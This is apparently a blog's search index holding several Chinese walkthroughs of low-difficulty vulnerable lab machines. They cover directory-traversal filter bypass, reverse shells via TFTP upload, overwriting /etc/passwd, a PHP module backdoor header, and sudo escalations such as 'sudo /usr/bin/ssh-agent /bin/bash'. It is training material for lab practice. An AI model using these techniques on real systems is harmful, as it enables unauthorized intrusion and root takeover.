我们可以使用WFUZZ来爆破一下目录穿越（这里使用../可能被过滤了我们双写绕过\u0026hellip;./）\nNMAP扫描 发现了file参数可用我们直接网址访问下发现了wujing和tftp服务这是UDP的服务69端口所以我们扫描端口不要忘记扫描UDP啊！！！\nNMAP扫描 NMAP扫描 登录试试\nNMAP扫描 我们put一个文件上传上去试试能不能访问\nNMAP扫描 发现可以直接访问直接使用反弹shell\nNMAP扫描 拿到shell权限 # 拿到了shell翻啊翻没什么东西我们用一个工具可以查看进程pspy\nNMAP扫描 发现有一个NC反弹定时任务\n通过密码登录login.php\nNMAP扫描 直接反弹了wujing\nNMAP扫描 ![v\n我们先写SSH写完登录后sudo -l 发现可以使用tftp\nNMAP扫描 拿root # 这里思路有：\n​\t1：我们把passwd下载下来 修改里面root里面的x为hash值111111使用mkpasswd生成\n​\t2: 我们在etc下面get passwd文件覆盖原先的passwd然后登录\nNMAP扫描 在etc下面get覆盖\nNMAP扫描 然后登录root 拿到ROOT权限\nNMAP扫描 总结一下我们可以用find来看看新的文件 # 1：ps里面查看不了的可以使用这个工具来查看全面\n2：nmap扫描可以扫描UDP不只有TCP\n3：目录穿越可以双写过滤\n4：passwd里面x修改后与shadow里面密码可能有造成系统问题 自己机器别瞎改\nNMAP扫描 ","date":"26 May 2025","externalUrl":null,"permalink":"/posts/dayao/","section":"Posts","summary":"","title":"大窑dayao靶机---难度LOW-知识点-tftp-udp-定时任务","type":"posts"},{"content":"","date":"23 May 2025","externalUrl":null,"permalink":"/tags/module/","section":"Tags","summary":"","title":"Module","type":"tags"},{"content":" VulNyx-infected靶机-知识点-module # Nmap扫描发现两个端口开放 # NMAP扫描 同时dirsearch一下\ndirsearch 可以只有一个info.php 打开是一个phpinfo界面\ndirsearch 这里我爆破了但是没用看了下WP发现有一个module backdoor 可以利用\ndirsearch 命令就是在文件头加上\nBackdoor: 系统命令\ndirsearch 拿到shell权限 # 很简单直接sudo -l 上网站https://gtfobins.github.io/ 搜对应的提权即可后面都很简单\ndirsearch 然后我们加一个SSH 登录方面免得有些功能不能用\ndirsearch SSH登录发现可以用一个joe\njoe:是一个文本编辑器 通过ctrl+k ! /bin/bash 可以直接执行命令造成提权\ndirsearch 提权ROOT\n拿到root # dirsearch # 总结一下 # PHPinfo里面可以看配置以外，也可以看看模组\n","date":"23 May 2025","externalUrl":null,"permalink":"/posts/infected/","section":"Posts","summary":"","title":"VUlNyx-infected靶机---难度LOW-知识点-backdoor-module","type":"posts"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/agent/","section":"Tags","summary":"","title":"Agent","type":"tags"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/dirb/","section":"Tags","summary":"","title":"Dirb","type":"tags"},{"content":" Vulnyx-agent靶机-LOW-知识点-Agent-dirb工具 # NMAP发现 # 1:nmap靶机发现开了两个端口80和22 # test 2:我们上网页看看发现什么都没有发现然后使用dirsearch什么都扫不到 # test 3:然后这里等了很久不知道干嘛看了下WP看了一下工具发现还有一个叫dirb的他和dirsearch区别是有一个递归查询我们用它来查询可以发现爆破出来了很多 # test 4:发现一个websvn 我们可以直接登录看看页面 # test 5：直接搜一搜nday 然后发现直接可以弹shell\ntest 成功拿到webshell # test 1:我们拿到的shell后我翻了很多文件发现不行 爆破了也没爆破出来用户叫dustin的我们试试sudo -l发现可以用一个叫C99的程序 （C语言标准版本） # 这里注意用这个c99需要一个终端我们来上一个终端\ntest 2：这里用-u dustin来使用然后到https://gtfobins.github.io/gtfobins/c99/ 来使用提权代码 # test 为了方便使用我们设置下SSH公钥登录\ntest 3:公钥登录后直接sudo -l发现可以用一个叫ssh-agent的 # ssh-agent: 是一种用于管理 SSH 密钥的工具,通过将私钥加载到 ssh-agent 中，后续连接时无需手动输入私钥密码\n我们依然在前面搜索下提权代码\nsudo /usr/bin/ssh-agent /bin/bash\ntest 成功get root # test # TIPs # 1：dirb 是一个递归的爆破和dirsearch不同 默认字典在/usr/share/dirb/wordlists/common.txt\n还有一个密码字典推荐下usr/share/john/password.lst\n2：sudo -u xx 指定用户使用命令\n","date":"22 May 2025","externalUrl":null,"permalink":"/posts/agent/","section":"Posts","summary":"","title":"Vulnyx-agent靶机-LOW-知识点-Agent-dirb工具","type":"posts"},{"content":"","date":"19 May 2025","externalUrl":null,"permalink":"/tags/bash_history/","section":"Tags","summary":"","title":"Bash_history","type":"tags"},{"content":" Commit靶机-知识点-看 # 我是懦夫我没做出来\nNmap扫描发现两个端口开放 # NMAP扫描 同时dirsearch一下\ndirsearch 可以发现有几个目录\n拿到shell权限 # 但是我们依次访问或者对登录口做爆破啊 sql注入啊发现没有 这时候可以看看源码（其实一开始就可以看看）\n源码 通过密码登录login.php\n源码 但是我测试很久的上传和PING；都不行 因为有一个upload文件夹想到上传后可以包含一下通过源码下面的file参数但是都加载不了\n于是我们先查看一下etc/passwd发现可以\u0026ndash;但是其他都做不了但是我们得到了一个用户lingmj\n源码 这时候就要想到.bash_history了\n源码 再查看git/config 源码 拿到一个密码直接登录拿到shell 和userflag\n源码 拿root # 1:我们可以看看SSH的配置文件因为它改端口了2222了\n源码 发现有Root密码但是拒绝了SSH登录我们可以本地登录过去\n源码 2：我们可以翻阅etc下面的passwd- 和shadow-获取信息\n发现passwd我们可以看通过passwd-以前的配置文件发现注释有一个密码 是welcome的\n源码 登录上去也没啥用\n总结一下我们可以用find来看看新的文件 # find / -newer /etc/passwd 2\u0026gt;a | grep -Pv \u0026lsquo;sys|proc|var|run|share|dev|tmp|git\u0026rsquo;\n-newer /etc/passwd ：比etcpasswd新的\n通过正则过滤掉sys|proc|var|run|share|dev|tmp|git开头 就会发现新的文件\n源码 多看看一些配置文件对一些东西很敏感比如端口改了你就应该去看看SSH配置文件\n","date":"19 May 2025","externalUrl":null,"permalink":"/posts/commit/","section":"Posts","summary":"","title":"Commit靶机---难度LOW-知识点-bash_history","type":"posts"},{"content":"","date":"19 May 2025","externalUrl":null,"permalink":"/tags/ssh/","section":"Tags","summary":"","title":"SSH","type":"tags"},{"content":" Qingmei靶机 知识点-banner # NMAP发现 # nmap靶机发现开了两个端口80和22但是我们到网页发现不到什么目录也扫不到什么我们可以SSH试一试看看\ntest 发现一个banner写了账号和密码我们直接登录上去\nps:banner就是用户自定义显示的东西 你一上去就显示出来的比如下面的牛子\ntest 一进去点下h弹出命令界面直接下拉看到了一个!command\n可以试一下command id 试试可以不可以执行出命令\ntest 发现可以执行出命令\ntest 那可以直接弹SHELL 或者!sh试试\ntest 但是我们用着特别难受 开一个终端就要重新进去那个界面这里介绍一个文件\n.bashrc：用于储存用户的个性化设置。在每次打开新的终端时自动执行特定的命令或脚本\n我们可以去看看这个文件是不是添加了什么\ntest 发现有一个less banner 然后exit我们把它删除然后ssh看看可以登录不\ntail -n 2 ~/.bashrc :取后两行查看\nsed -i \u0026lsquo;$d;$d\u0026rsquo; ~/.bashrc ：删除最后两行\n然后我们弹终端就不会进入那个界面或者直接SSH登录上去就行\ntest 然后我们要研究下怎么提权\n我们发现home 下面有一个morri 用户我们进入不了\n1：我们直接SSH 猜测弱密码morri\ntest 2:翻到了/opt下面的文件有一个\ntest 他叫你输入一个A来完成任务你可以一次一次的输入也可以 -h 查看有没有什么其他功能发现可以 \u0026ndash;dashazi直接输出\ntest get到了密码\n到了morri用户 # 我们直接sudo -l 发现了\n(ALL) NOPASSWD: /usr/bin/ranger\n这是一个文件编辑器很简单了直接sudo运行查看即可\ntest 然后大写S 拿到终端\ntest TIPs # opt目录是一个存软件的目录有些软件没有在默认的usr就在这里 所以可以看看这个目录\n你可以试试跳过配置登录SSH 指定命令可以越过bashrc\n","date":"19 May 2025","externalUrl":null,"permalink":"/posts/qingmei/","section":"Posts","summary":"","title":"群友Qingmei靶机-LOW-知识点-SSH","type":"posts"},{"content":" Loower靶机-包含知识点呃呃呃\u0026ndash;SSH # 1：通过FTP发现了两个用户一个是ftpuser,通过爆破获得密码登录 # 2：通过ftpuser进入shell 然后查看welcome 发现有一个 backup.sh # cat一下发现welcome密码通过john爆破得出密码 # 3：然后牛逼的就来了 发现sudo 有一个什么figlet 你会想和cowsay有用吗 但是.. 零蛋！ 直接SSHroot因为什么发现welcome下有SSH目录可能可以直接登录 # welcome/.ssh/id_rsa root@172.20.10.2 来登录root 因为包含了welcome的公钥\n测试图片加载 谢谢观看 # ","date":"17 May 2025","externalUrl":null,"permalink":"/posts/loweeeeee/","section":"Posts","summary":"","title":"Loower靶机---难度LOW-知识点-SSH观察","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"这里是归档页面。\n","externalUrl":null,"permalink":"/archives/","section":"归档","summary":"","title":"归档","type":"archives"}]